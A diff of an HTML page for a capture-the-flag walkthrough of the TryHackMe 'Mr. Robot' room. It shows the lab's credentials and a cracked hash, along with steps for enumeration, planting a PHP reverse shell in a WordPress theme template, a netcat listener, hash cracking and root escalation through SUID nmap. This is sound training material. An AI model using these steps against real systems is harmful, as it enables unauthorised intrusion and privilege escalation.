@@ -61,7 +61,7 @@
     <details class="toc" id="toc-details" open>
       <summary class="toc-summary">Contents</summary>
       <div class="toc-eyebrow">on this page</div>
-      <nav class="toc-list" id="toc-list">
+            <nav class="toc-list" id="toc-list">
         <a href="#introduction" data-target="introduction"><span class="toc-icon">&#128075;</span>Introduction</a>
         <a href="#phase-1" data-target="phase-1"><span class="toc-icon">&#128269;</span>Phase 1: Reconnaissance</a>
         <a href="#phase-2" data-target="phase-2"><span class="toc-icon">&#128193;</span>Phase 2: Web Enumeration</a>
@@ -69,62 +69,87 @@
         <a href="#dictionary" data-target="dictionary"><span class="toc-icon">&#128218;</span>The Dictionary File</a>
         <a href="#phase-3" data-target="phase-3"><span class="toc-icon">&#128274;</span>Phase 3: WordPress Discovery</a>
         <a href="#phase-4" data-target="phase-4"><span class="toc-icon">&#128137;</span>Phase 4: Gaining Foothold</a>
+        <a href="#uploading-shell" data-target="uploading-shell" class="sub">Uploading the Reverse Shell</a>
+        <a href="#starting-listener" data-target="starting-listener" class="sub">Starting the Listener</a>
+        <a href="#triggering-shell" data-target="triggering-shell" class="sub">Triggering the Shell</a>
+        <a href="#stabilizing-shell" data-target="stabilizing-shell" class="sub">Stabilizing the Shell</a>
         <a href="#phase-5" data-target="phase-5"><span class="toc-icon">&#128100;</span>Phase 5: Daemon to Robot</a>
+        <a href="#finding-hash" data-target="finding-hash" class="sub">Finding the Password Hash</a>
+        <a href="#switching-robot" data-target="switching-robot" class="sub">Switching to Robot User</a>
+        <a href="#flag-2" data-target="flag-2"><span class="toc-icon">&#128273;</span>Second Flag &mdash; Key 2 of 3</a>
         <a href="#phase-6" data-target="phase-6"><span class="toc-icon">&#128081;</span>Phase 6: Robot to Root</a>
+        <a href="#suid-nmap" data-target="suid-nmap" class="sub">Interesting SUID Binary: nmap</a>
+        <a href="#flag-3" data-target="flag-3"><span class="toc-icon">&#128273;</span>Third Flag &mdash; Key 3 of 3</a>
       </nav>
     </details>
   </aside>
 
-  <article class="reader-article" id="reader-article">
+    <article class="reader-article" id="reader-article">
 
     <h2 class="rc-h2" id="introduction"><span class="h2-icon">&#128075;</span>Introduction</h2>
-    <p class="rc-p">Hello everyone! Sh4d0wSpl01t here. Today we're going to dive deep into <strong>Mr. Robot</strong>, a medium-level machine on TryHackMe inspired by the hit TV series. This room covers web enumeration, WordPress exploitation, password cracking, and privilege escalation via SUID binaries.</p>
+    <p class="rc-p">Hello everyone! Sh4d0wSpl01t here. Today we're going to dive deep into <strong>Mr. Robot</strong>, a medium-level machine on TryHackMe inspired by the hit TV series. This room challenges us with real-world techniques including web enumeration, WordPress exploitation, password cracking, and privilege escalation via SUID binaries.</p>
+    <p class="rc-p">What makes this box particularly interesting is that it forces us to think about multiple attack vectors:</p>
     <ul class="rc-list">
       <li>Hidden directories and information disclosure via /robots.txt</li>
       <li>WordPress credential brute-forcing with a custom dictionary</li>
-      <li>Reverse shell delivery through theme injection</li>
+      <li>Reverse shell manipulation through theme injection</li>
       <li>SUID binary abuse for root privilege escalation</li>
     </ul>
-    <p class="rc-p">Let's hack our way into the system — just like our favorite hacker, Elliot Alderson.</p>
+    <p class="rc-p">Let's hack our way into the system — just like our favorite hacker, Elliot.</p>
 
     <h2 class="rc-h2" id="phase-1"><span class="h2-icon">&#128269;</span>Phase 1: Reconnaissance</h2>
-    <p class="rc-p">As with any pentest, we start with enumeration. Our weapon of choice: nmap.</p>
+    <p class="rc-p">As with any penetration test, we start with enumeration. Our weapon of choice? Nmap — the Swiss Army knife of network scanning.</p>
     <div class="rc-code">
       <div class="rc-code-head"><span>bash</span><button class="rc-copy" data-target="code-nmap">copy</button></div>
       <pre><code id="code-nmap">nmap -sC -sV -oN nmap-initial.txt 10.10.x.x</code></pre>
     </div>
     <figure class="rc-media" id="media-nmap-scan">
       <div class="rc-media-frame">
-        <img src="static/assets/mr-robot/nmap-scan.png" alt="nmap scan" onerror="mediaMissing(this)">
+        <img src="static/assets/mr-robot/nmap-scan.png" alt="running the nmap scan" onerror="mediaMissing(this)">
         <div class="rc-media-fallback"><strong>Image not found</strong><small>expected at: static/assets/mr-robot/nmap-scan.png</small></div>
       </div>
-      <figcaption class="rc-caption">nmap scan on the target IP</figcaption>
+      <figcaption class="rc-caption">Running our nmap scan against our target IP Address</figcaption>
     </figure>
-    <p class="rc-p">Scan Results:</p>
+    <p class="rc-p"><strong>Scan Results:</strong></p>
     <figure class="rc-media" id="media-nmap-results">
       <div class="rc-media-frame">
         <img src="static/assets/mr-robot/nmap-scan-results.png" alt="nmap scan results" onerror="mediaMissing(this)">
         <div class="rc-media-fallback"><strong>Image not found</strong><small>expected at: static/assets/mr-robot/nmap-scan-results.png</small></div>
       </div>
-      <figcaption class="rc-caption">nmap scan results against the target IP</figcaption>
+      <figcaption class="rc-caption">Nmap scan results</figcaption>
     </figure>
 
-    <h2 class="rc-h2" id="phase-2"><span class="h2-icon">&#128193;</span>Phase 2: Web Enumeration &mdash; the robots.txt discovery</h2>
-    <p class="rc-p">The landing page looks stylish, but the real treasure is in hidden directories. Time to brute-force them.</p>
+    <h2 class="rc-h2" id="phase-2"><span class="h2-icon">&#128193;</span>Phase 2: Web Enumeration &mdash; The Robots.txt Discovery</h2>
+    <p class="rc-p">Navigating to <code>http://10.146.157.129</code> reveals a stylish landing page. But the real treasure lies in hidden directories. Let's brute-force:</p>
     <div class="rc-code">
       <div class="rc-code-head"><span>bash</span><button class="rc-copy" data-target="code-ffuf">copy</button></div>
       <pre><code id="code-ffuf">ffuf -u http://10.10.x.x/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</code></pre>
     </div>
-    <figure class="rc-media" id="media-ffuf">
+    <figure class="rc-media" id="media-ffuf-run">
+      <div class="rc-media-frame">
+        <img src="static/assets/mr-robot/ffuf-run.png" alt="ffuf running" onerror="mediaMissing(this)">
+        <div class="rc-media-fallback"><strong>Image not found</strong><small>expected at: static/assets/mr-robot/ffuf-run.png</small></div>
+      </div>
+    </figure>
+    <p class="rc-p"><strong>Ffuf scan results:</strong></p>
+    <figure class="rc-media" id="media-ffuf-results">
       <div class="rc-media-frame">
         <img src="static/assets/mr-robot/ffuf-results.png" alt="ffuf scan results" onerror="mediaMissing(this)">
         <div class="rc-media-fallback"><strong>Image not found</strong><small>expected at: static/assets/mr-robot/ffuf-results.png</small></div>
       </div>
-      <figcaption class="rc-caption">ffuf directory brute-force results</figcaption>
+      <figcaption class="rc-caption">ffuf scan results</figcaption>
     </figure>
-    <p class="rc-p">The <code>robots</code> path stands out. Navigating to <code>/robots</code> turns up two immediate findings: a flag file and a wordlist.</p>
+    <p class="rc-p">Now we have successfully enumerated potentially available directories for us to navigate to. The robots folder seems interesting. So first navigate to <code>http://ip.addr/robots</code></p>
+    <figure class="rc-media" id="media-robots-dir">
+      <div class="rc-media-frame">
+        <img src="static/assets/mr-robot/robots-directory.png" alt="the /robots directory listing" onerror="mediaMissing(this)">
+        <div class="rc-media-fallback"><strong>Image not found</strong><small>expected at: static/assets/mr-robot/robots-directory.png</small></div>
+      </div>
+    </figure>
+    <p class="rc-p"><strong>Boom!</strong> Two immediate findings:</p>
 
     <h2 class="rc-h2" id="flag-1"><span class="h2-icon">&#128273;</span>First Flag &mdash; Key 1 of 3</h2>
+    <p class="rc-p">I will use curl to extract the information stored within key-1-of-3.txt</p>
     <div class="rc-code">
       <div class="rc-code-head"><span>bash</span><button class="rc-copy" data-target="code-flag1">copy</button></div>
       <pre><code id="code-flag1">curl http://10.10.x.x/key-1-of-3.txt</code></pre>
@@ -134,17 +159,57 @@
         <img src="static/assets/mr-robot/flag1-curl.png" alt="curl output for flag 1" onerror="mediaMissing(this)">
         <div class="rc-media-fallback"><strong>Image not found</strong><small>expected at: static/assets/mr-robot/flag1-curl.png</small></div>
       </div>
-      <figcaption class="rc-caption">Extracting key-1-of-3.txt with curl</figcaption>
+      <figcaption class="rc-caption">curl's output for flag 1</figcaption>
     </figure>
+    <p class="rc-p">Copy this flag and submit it. <strong>First key down!</strong></p>
 
     <h2 class="rc-h2" id="dictionary"><span class="h2-icon">&#128218;</span>The Dictionary File</h2>
-    <p class="rc-p">We also grab the wordlist <code>fsocity.dic</code> — it comes in handy later for cracking a password hash.</p>
+    <p class="rc-p">We also need to download the wordlist fsocity.dic which will come in handy later.</p>
+    <p class="rc-p">Using curl:</p>
     <div class="rc-code">
-      <div class="rc-code-head"><span>bash</span><button class="rc-copy" data-target="code-dic">copy</button></div>
-      <pre><code id="code-dic">curl -O http://10.10.x.x/fsocity.dic
-sort fsocity.dic | uniq > fsocity-clean.dic</code></pre>
+      <div class="rc-code-head"><span>bash</span><button class="rc-copy" data-target="code-dic-dl">copy</button></div>
+      <pre><code id="code-dic-dl">curl -O http://10.10.x.x/fsocity.dic</code></pre>
     </div>
-    <p class="rc-p">Digging through the <code>license</code> directory turns up a base64 blob buried further down the page.</p>
+    <figure class="rc-media" id="media-dic-dl">
+      <div class="rc-media-frame">
+        <img src="static/assets/mr-robot/dictionary-download.png" alt="downloading fsocity.dic" onerror="mediaMissing(this)">
+        <div class="rc-media-fallback"><strong>Image not found</strong><small>expected at: static/assets/mr-robot/dictionary-download.png</small></div>
+      </div>
+      <figcaption class="rc-caption">Downloading the fsocity.dic using curl</figcaption>
+    </figure>
+    <p class="rc-p">The wordlist 'fsocity.dic' contains a lot of repetitive words. Let's clean the file and redirect the clean output to a new file.</p>
+    <div class="rc-code">
+      <div class="rc-code-head"><span>bash</span><button class="rc-copy" data-target="code-dic-clean">copy</button></div>
+      <pre><code id="code-dic-clean">sort fsocity.dic | uniq > fsocity-clean.dic</code></pre>
+    </div>
+    <figure class="rc-media" id="media-dic-clean">
+      <div class="rc-media-frame">
+        <img src="static/assets/mr-robot/dictionary-clean.png" alt="cleaning the wordlist with sort and uniq" onerror="mediaMissing(this)">
+        <div class="rc-media-fallback"><strong>Image not found</strong><small>expected at: static/assets/mr-robot/dictionary-clean.png</small></div>
+      </div>
+      <figcaption class="rc-caption">Using sort and uniq to clean the wordlist</figcaption>
+    </figure>
+    <p class="rc-p">Using curl lets dump information from the directories we got from our ffuf scan results.</p>
+    <div class="rc-code">
+      <div class="rc-code-head"><span>bash</span><button class="rc-copy" data-target="code-license-curl">copy</button></div>
+      <pre><code id="code-license-curl">curl http://10.10.x.x/license</code></pre>
+    </div>
+    <figure class="rc-media" id="media-license-curl">
+      <div class="rc-media-frame">
+        <img src="static/assets/mr-robot/license-curl-output.png" alt="curl output of the license directory" onerror="mediaMissing(this)">
+        <div class="rc-media-fallback"><strong>Image not found</strong><small>expected at: static/assets/mr-robot/license-curl-output.png</small></div>
+      </div>
+      <figcaption class="rc-caption">curl output</figcaption>
+    </figure>
+    <p class="rc-p">The license folder has nothing much on it but if you scroll down you will find something interesting and worth looking into.</p>
+    <figure class="rc-media" id="media-base64-embedded">
+      <div class="rc-media-frame">
+        <img src="static/assets/mr-robot/base64-embedded.png" alt="base64 text embedded in the page" onerror="mediaMissing(this)">
+        <div class="rc-media-fallback"><strong>Image not found</strong><small>expected at: static/assets/mr-robot/base64-embedded.png</small></div>
+      </div>
+      <figcaption class="rc-caption">base64 text embedded</figcaption>
+    </figure>
+    <p class="rc-p">We can see a base64 text embedded into the license directory. Let's decode to see what it has for us.</p>
     <div class="rc-code">
       <div class="rc-code-head"><span>bash</span><button class="rc-copy" data-target="code-b64">copy</button></div>
       <pre><code id="code-b64">echo '&lt;base64 string&gt;' | base64 -d</code></pre>
@@ -154,61 +219,107 @@ sort fsocity.dic | uniq > fsocity-clean.dic</code></pre>
         <img src="static/assets/mr-robot/base64-decode.png" alt="decoding the base64 string" onerror="mediaMissing(this)">
         <div class="rc-media-fallback"><strong>Image not found</strong><small>expected at: static/assets/mr-robot/base64-decode.png</small></div>
       </div>
-      <figcaption class="rc-caption">Decoding the embedded base64 string reveals WordPress credentials</figcaption>
+      <figcaption class="rc-caption">Decoding the base64</figcaption>
     </figure>
+    <p class="rc-p">After decoding we have found a note rather a credential to use on the WordPress login page.</p>
 
     <h2 class="rc-h2" id="phase-3"><span class="h2-icon">&#128274;</span>Phase 3: WordPress Discovery &amp; Brute Force</h2>
-    <p class="rc-p">The presence of <code>/wp-login</code> confirms a WordPress install. We already have a decoded credential to try.</p>
+    <p class="rc-p">The presence of <code>wp-login</code> confirms a WordPress installation. We are required to fill in the field parameters username and password for us to successfully have been granted access to whatever lies behind this page.</p>
+    <p class="rc-p">Let's navigate to the WordPress login page:</p>
     <figure class="rc-media" id="media-wplogin">
       <div class="rc-media-frame">
         <img src="static/assets/mr-robot/wp-login.png" alt="WordPress login page" onerror="mediaMissing(this)">
         <div class="rc-media-fallback"><strong>Image not found</strong><small>expected at: static/assets/mr-robot/wp-login.png</small></div>
       </div>
-      <figcaption class="rc-caption">The WordPress login page at /wp-login</figcaption>
+      <figcaption class="rc-caption">WordPress Login Page</figcaption>
     </figure>
 
     <h2 class="rc-h2" id="phase-4"><span class="h2-icon">&#128137;</span>Phase 4: Gaining Foothold &mdash; WordPress to Reverse Shell</h2>
-    <p class="rc-p">Logging in with <code>elliot</code> / <code>ER28-0652</code> gets us into the WordPress admin panel.</p>
-    <ul class="rc-list">
+    <p class="rc-p">Log into WordPress admin panel:</p>
+    <div class="rc-code">
+      <div class="rc-code-head"><span>bash</span><button class="rc-copy" data-target="code-creds">copy</button></div>
+      <pre><code id="code-creds">http://ip.addr/wp-login
+Username: elliot
+Password: ER28-0652</code></pre>
+    </div>
+
+    <h3 class="rc-h3" id="uploading-shell">Uploading the Reverse Shell</h3>
+    <ol class="rc-list">
       <li>Navigate to Appearance &rarr; Theme Editor</li>
-      <li>Select the 404.php template — often overlooked, perfect for a payload</li>
-      <li>Replace the contents with a PHP reverse shell and click Update File</li>
-    </ul>
+      <li>Select the 404.php template (often overlooked but perfect for our needs)</li>
+      <li>Replace the content with a PHP reverse shell</li>
+    </ol>
+    <figure class="rc-media" id="media-revshell-payload">
+      <div class="rc-media-frame">
+        <img src="static/assets/mr-robot/reverse-shell-payload.png" alt="PHP reverse shell pasted into the theme editor" onerror="mediaMissing(this)">
+        <div class="rc-media-fallback"><strong>Image not found</strong><small>expected at: static/assets/mr-robot/reverse-shell-payload.png</small></div>
+      </div>
+      <figcaption class="rc-caption">PHP Reverse Shell</figcaption>
+    </figure>
+    <p class="rc-p">Click <strong>Update File</strong> to save.</p>
+
+    <h3 class="rc-h3" id="starting-listener">Starting the Listener</h3>
+    <p class="rc-p">On your attacking machine:</p>
     <div class="rc-code">
       <div class="rc-code-head"><span>bash</span><button class="rc-copy" data-target="code-nc">copy</button></div>
-      <pre><code id="code-nc"># on the attacking machine
-nc -lvnp 1234</code></pre>
+      <pre><code id="code-nc">nc -lvnp 1234</code></pre>
     </div>
+
+    <h3 class="rc-h3" id="triggering-shell">Triggering the Shell</h3>
+    <p class="rc-p">Visit any non-existent page or directly access the 404 template:</p>
     <div class="rc-code">
       <div class="rc-code-head"><span>bash</span><button class="rc-copy" data-target="code-trigger">copy</button></div>
-      <pre><code id="code-trigger"># trigger the shell by requesting a page that 404s
-curl http://10.10.x.x/?404.php</code></pre>
+      <pre><code id="code-trigger">curl http://ip.addr/?404.php</code></pre>
     </div>
     <figure class="rc-media" id="media-revshell">
       <div class="rc-media-frame">
         <img src="static/assets/mr-robot/reverse-shell.png" alt="reverse shell caught on netcat listener" onerror="mediaMissing(this)">
         <div class="rc-media-fallback"><strong>Image not found</strong><small>expected at: static/assets/mr-robot/reverse-shell.png</small></div>
       </div>
-      <figcaption class="rc-caption">Shell caught as the daemon user</figcaption>
+      <figcaption class="rc-caption">Connected successfully</figcaption>
     </figure>
-    <p class="rc-p">Stabilize the shell once it lands:</p>
+    <p class="rc-p"><strong>Connection established!</strong> We have a reverse shell as the daemon user.</p>
+
+    <h3 class="rc-h3" id="stabilizing-shell">Stabilizing the Shell</h3>
     <div class="rc-code">
       <div class="rc-code-head"><span>bash</span><button class="rc-copy" data-target="code-stabilize">copy</button></div>
       <pre><code id="code-stabilize">python3 -c 'import pty;pty.spawn("/bin/bash")'
 export TERM=xterm
 export SHELL=/bin/bash
-# Ctrl+Z, then:
+# Press Ctrl+Z, then run:
 stty raw -echo; fg</code></pre>
     </div>
 
     <h2 class="rc-h2" id="phase-5"><span class="h2-icon">&#128100;</span>Phase 5: Privilege Escalation &mdash; From Daemon to Robot</h2>
+    <p class="rc-p">Now that we have a foothold, let's explore the system:</p>
     <div class="rc-code">
       <div class="rc-code-head"><span>bash</span><button class="rc-copy" data-target="code-home">copy</button></div>
-      <pre><code id="code-home">ls -la /home
-cd /home/robot
-cat password.raw-md5</code></pre>
+      <pre><code id="code-home">ls -la /home</code></pre>
     </div>
-    <p class="rc-p">That's an MD5 hash — crack it with John the Ripper against rockyou:</p>
+    <p class="rc-p">We see a user named robot. Navigate to their directory:</p>
+    <div class="rc-code">
+      <div class="rc-code-head"><span>bash</span><button class="rc-copy" data-target="code-robot-dir">copy</button></div>
+      <pre><code id="code-robot-dir">cd /home/robot
+ls -la</code></pre>
+    </div>
+
+    <h3 class="rc-h3" id="finding-hash">Finding the Password Hash</h3>
+    <div class="rc-code">
+      <div class="rc-code-head"><span>bash</span><button class="rc-copy" data-target="code-hash">copy</button></div>
+      <pre><code id="code-hash">cat password.raw-md5</code></pre>
+    </div>
+    <figure class="rc-media" id="media-hash">
+      <div class="rc-media-frame">
+        <img src="static/assets/mr-robot/password-hash.png" alt="the robot user's md5 password hash" onerror="mediaMissing(this)">
+        <div class="rc-media-fallback"><strong>Image not found</strong><small>expected at: static/assets/mr-robot/password-hash.png</small></div>
+      </div>
+    </figure>
+    <p class="rc-p">Output:</p>
+    <div class="rc-code">
+      <div class="rc-code-head"><span>output</span><button class="rc-copy" data-target="code-hash-out">copy</button></div>
+      <pre><code id="code-hash-out">robot:c3fcd3d76192e4007dfb496cca67e13b</code></pre>
+    </div>
+    <p class="rc-p">This is an MD5 hash. Let's crack it using John the Ripper or an online service:</p>
     <div class="rc-code">
       <div class="rc-code-head"><span>bash</span><button class="rc-copy" data-target="code-john">copy</button></div>
       <pre><code id="code-john">echo "c3fcd3d76192e4007dfb496cca67e13b" > hash.txt
@@ -219,40 +330,91 @@ john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt</code
         <img src="static/assets/mr-robot/john-crack.png" alt="John the Ripper cracking the hash" onerror="mediaMissing(this)">
         <div class="rc-media-fallback"><strong>Image not found</strong><small>expected at: static/assets/mr-robot/john-crack.png</small></div>
       </div>
-      <figcaption class="rc-caption">John cracks the robot user's MD5 hash</figcaption>
     </figure>
+    <p class="rc-p"><strong>Cracked password:</strong> <code>abcdefghijklmnopqrstuvwxyz</code></p>
+
+    <h3 class="rc-h3" id="switching-robot">Switching to Robot User</h3>
     <div class="rc-code">
-      <div class="rc-code-head"><span>bash</span><button class="rc-copy" data-target="code-key2">copy</button></div>
-      <pre><code id="code-key2">su robot
-cat /home/robot/key-2-of-3.txt</code></pre>
+      <div class="rc-code-head"><span>bash</span><button class="rc-copy" data-target="code-su">copy</button></div>
+      <pre><code id="code-su">su robot
+Password: abcdefghijklmnopqrstuvwxyz</code></pre>
     </div>
 
+    <h2 class="rc-h2" id="flag-2"><span class="h2-icon">&#128273;</span>Second Flag &mdash; Key 2 of 3</h2>
+    <div class="rc-code">
+      <div class="rc-code-head"><span>bash</span><button class="rc-copy" data-target="code-key2">copy</button></div>
+      <pre><code id="code-key2">cat /home/robot/key-2-of-3.txt</code></pre>
+    </div>
+    <figure class="rc-media" id="media-key2">
+      <div class="rc-media-frame">
+        <img src="static/assets/mr-robot/key2-flag.png" alt="key-2-of-3.txt contents" onerror="mediaMissing(this)">
+        <div class="rc-media-fallback"><strong>Image not found</strong><small>expected at: static/assets/mr-robot/key2-flag.png</small></div>
+      </div>
+    </figure>
+    <p class="rc-p">Copy this flag and submit it. <strong>Second key down!</strong></p>
+
     <h2 class="rc-h2" id="phase-6"><span class="h2-icon">&#128081;</span>Phase 6: Privilege Escalation &mdash; From Robot to Root</h2>
-    <p class="rc-p">Time to hunt for SUID binaries — files that execute with the owner's privileges.</p>
+    <p class="rc-p">Now we need root access. Let's check for SUID binaries — files that run with the owner's privileges:</p>
     <div class="rc-code">
       <div class="rc-code-head"><span>bash</span><button class="rc-copy" data-target="code-suid">copy</button></div>
       <pre><code id="code-suid">find / -type f -perm -04000 2>/dev/null</code></pre>
     </div>
     <figure class="rc-media" id="media-suid">
       <div class="rc-media-frame">
-        <img src="static/assets/mr-robot/suid-find.png" alt="SUID binaries found on the system" onerror="mediaMissing(this)">
+        <img src="static/assets/mr-robot/suid-find.png" alt="SUID and SGID binaries found on the system" onerror="mediaMissing(this)">
         <div class="rc-media-fallback"><strong>Image not found</strong><small>expected at: static/assets/mr-robot/suid-find.png</small></div>
       </div>
-      <figcaption class="rc-caption">nmap turns up as an unexpected SUID binary</figcaption>
+      <figcaption class="rc-caption">SUID and SGID files</figcaption>
     </figure>
-    <p class="rc-p">nmap's interactive mode allows shelling out — and since it runs as root, that gives us a root shell.</p>
+
+    <h3 class="rc-h3" id="suid-nmap">Interesting SUID Binary Found: nmap</h3>
+    <div class="rc-code">
+      <div class="rc-code-head"><span>bash</span><button class="rc-copy" data-target="code-nmap-ls">copy</button></div>
+      <pre><code id="code-nmap-ls">ls -l /usr/local/bin/nmap</code></pre>
+    </div>
+    <figure class="rc-media" id="media-nmap-suid">
+      <div class="rc-media-frame">
+        <img src="static/assets/mr-robot/nmap-suid-confirm.png" alt="confirming nmap is a SUID binary" onerror="mediaMissing(this)">
+        <div class="rc-media-fallback"><strong>Image not found</strong><small>expected at: static/assets/mr-robot/nmap-suid-confirm.png</small></div>
+      </div>
+      <figcaption class="rc-caption">Confirmation of nmap being a SUID file</figcaption>
+    </figure>
+    <p class="rc-p">Nmap has an interactive mode that allows command execution. Since it runs as root, we can spawn a root shell:</p>
     <div class="rc-code">
       <div class="rc-code-head"><span>bash</span><button class="rc-copy" data-target="code-nmap-int">copy</button></div>
       <pre><code id="code-nmap-int">nmap --interactive
 !sh</code></pre>
     </div>
+    <figure class="rc-media" id="media-nmap-int">
+      <div class="rc-media-frame">
+        <img src="static/assets/mr-robot/nmap-interactive-root.png" alt="root shell from nmap interactive mode" onerror="mediaMissing(this)">
+        <div class="rc-media-fallback"><strong>Image not found</strong><small>expected at: static/assets/mr-robot/nmap-interactive-root.png</small></div>
+      </div>
+      <figcaption class="rc-caption">Obtaining root access to our vuln machine</figcaption>
+    </figure>
+    <p class="rc-p">Navigate to the root directory:</p>
+    <div class="rc-code">
+      <div class="rc-code-head"><span>bash</span><button class="rc-copy" data-target="code-cdroot">copy</button></div>
+      <pre><code id="code-cdroot">cd /root</code></pre>
+    </div>
+    <p class="rc-p">Now list the contents in the root directory:</p>
+    <div class="rc-code">
+      <div class="rc-code-head"><span>bash</span><button class="rc-copy" data-target="code-lsroot">copy</button></div>
+      <pre><code id="code-lsroot">ls</code></pre>
+    </div>
+
+    <h2 class="rc-h2" id="flag-3"><span class="h2-icon">&#128273;</span>Third Flag &mdash; Key 3 of 3</h2>
     <div class="rc-code">
       <div class="rc-code-head"><span>bash</span><button class="rc-copy" data-target="code-key3">copy</button></div>
-      <pre><code id="code-key3">cd /root
-ls
-cat key-3-of-3.txt</code></pre>
+      <pre><code id="code-key3">cat /root/key-3-of-3.txt</code></pre>
     </div>
-    <p class="rc-p">All three keys captured — box rooted.</p>
+    <figure class="rc-media" id="media-key3">
+      <div class="rc-media-frame">
+        <img src="static/assets/mr-robot/key3-root-flag.png" alt="key-3-of-3.txt contents as root" onerror="mediaMissing(this)">
+        <div class="rc-media-fallback"><strong>Image not found</strong><small>expected at: static/assets/mr-robot/key3-root-flag.png</small></div>
+      </div>
+    </figure>
+    <p class="rc-p">Copy this flag and submit it. <strong>All three keys captured!</strong></p>
 
   </article>
 </div>
